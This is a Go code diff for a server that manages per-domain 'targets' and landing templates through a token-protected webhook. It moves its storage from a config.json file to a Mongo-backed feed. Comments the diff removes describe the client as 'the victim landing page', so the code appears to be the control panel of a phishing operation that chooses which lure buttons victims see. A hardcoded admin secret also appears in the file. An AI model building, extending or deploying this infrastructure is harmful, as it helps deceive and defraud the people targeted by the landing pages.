@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"log"
 	"net/http"
-	"os"
 	"sync"
 )
 
@@ -24,46 +23,24 @@ type GlobalConfig struct {
 var (
 	activeConfig *GlobalConfig
 	configMu     sync.RWMutex
-	configPath   = "config.json"
 
 	// This MUST match the PRISM_ROUTING_WEBHOOK_SECRET in your Node.js .env file.
 	adminToken = "a244a0c0f0210be8325ad0710df42872216a3acc460832a85086452792bc710c"
 )
 
-// initConfig loads the config from disk on startup, or creates a default one.
+// initConfig initializes only the in-memory compatibility state. Persistent
+// domain/landing/content configuration is loaded from the Mongo-backed runtime
+// feed by initRuntimeConfigReader().
 func initConfig() {
 	configMu.Lock()
-	defer configMu.Unlock()
-
-	data, err := os.ReadFile(configPath)
-	if err != nil {
-		log.Printf("[⚙️] config.json not found. Initializing default configuration.")
-		activeConfig = &GlobalConfig{Domains: make(map[string]*DomainState)}
-		saveConfigUnsafe()
-		return
-	}
-
-	var cfg GlobalConfig
-	if err := json.Unmarshal(data, &cfg); err != nil {
-		log.Printf("[!] Error parsing config.json: %v. Initializing default.", err)
-		activeConfig = &GlobalConfig{Domains: make(map[string]*DomainState)}
-		return
-	}
-	activeConfig = &cfg
-	log.Printf("[⚙️] Configuration loaded: %d domains tracked.", len(activeConfig.Domains))
+	activeConfig = &GlobalConfig{Domains: make(map[string]*DomainState)}
+	configMu.Unlock()
+	log.Printf("[⚙️] In-memory config initialized; Mongo runtime feed is authoritative.")
 }
 
-// saveConfigUnsafe writes the current memory state to disk.
-func saveConfigUnsafe() {
-	data, err := json.MarshalIndent(activeConfig, "", "  ")
-	if err != nil {
-		log.Printf("[!] Error marshaling config: %v", err)
-		return
-	}
-	if err := os.WriteFile(configPath, data, 0644); err != nil {
-		log.Printf("[!] Error writing config.json: %v", err)
-	}
-}
+// saveConfigUnsafe is retained for compatibility with the legacy webhook path.
+// Runtime configuration is no longer persisted to config.json.
+func saveConfigUnsafe() {}
 
 // IsTargetEnabled checks if a specific target is enabled for a given base domain.
 func IsTargetEnabled(baseDomain, targetKey string) bool {
@@ -89,14 +66,14 @@ func IsTargetEnabled(baseDomain, targetKey string) bool {
 
 // ── API HANDLERS ──
 
-// handleGetConfig is called by the victim landing page (App.jsx) to know which buttons to render.
-// It returns a unified structure: an array of enabled targets for the victim app,
-// AND boolean/string states for the admin dashboard.
 func handleGetConfig(w http.ResponseWriter, r *http.Request) {
 	_, baseDomain, _ := resolveHost(r.Host)
 
-	w.Header().Set("Access-Control-Allow-Origin", "*") // Keep CORS here for the victim React app
+	w.Header().Set("Access-Control-Allow-Origin", "*")
 	w.Header().Set("Content-Type", "application/json")
+
+	// Safe domain/landing state comes directly from the DB-backed runtime feed.
+	runtimeState, runtimeOK := getRuntimeDomainConfig(baseDomain)
 
 	configMu.RLock()
 	defer configMu.RUnlock()
@@ -127,6 +104,13 @@ func handleGetConfig(w http.ResponseWriter, r *http.Request) {
 			defaultTarget = state.DefaultTarget
 		}
 		isEnabled = state.Enabled
+	}
+
+	if runtimeOK {
+		isEnabled = runtimeState.Enabled
+		if templateID := landingTemplateFromRuntime(runtimeState); templateID != "" {
+			landingTemplate = templateID
+		}
 	}
 
 	response := map[string]interface{}{
@@ -213,7 +197,7 @@ func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 3. Update the in-memory state
+	// 3. Update the in-memory compatibility state.
 	configMu.Lock()
 	if activeConfig.Domains == nil {
 		activeConfig.Domains = make(map[string]*DomainState)
@@ -235,12 +219,9 @@ func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 		state.Targets = make(map[string]bool)
 	}
 
-	// CRITICAL LOGIC: Separate whole-domain toggles from individual-target toggles.
 	if req.Target != "" {
-		// Enable or disable ONE specific target.
 		state.Targets[req.Target] = req.Enabled
 	} else {
-		// Enable or disable the ENTIRE domain.
 		state.Enabled = req.Enabled
 	}
 
@@ -252,7 +233,7 @@ func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 		state.DefaultTarget = req.DefaultTarget
 	}
 
-	saveConfigUnsafe() // Persist to disk
+	saveConfigUnsafe()
 	configMu.Unlock()
 
 	log.Printf("[⚙️] WEBHOOK UPDATE: %s -> Template: %s, Target: %s, DomainEnabled: %v",
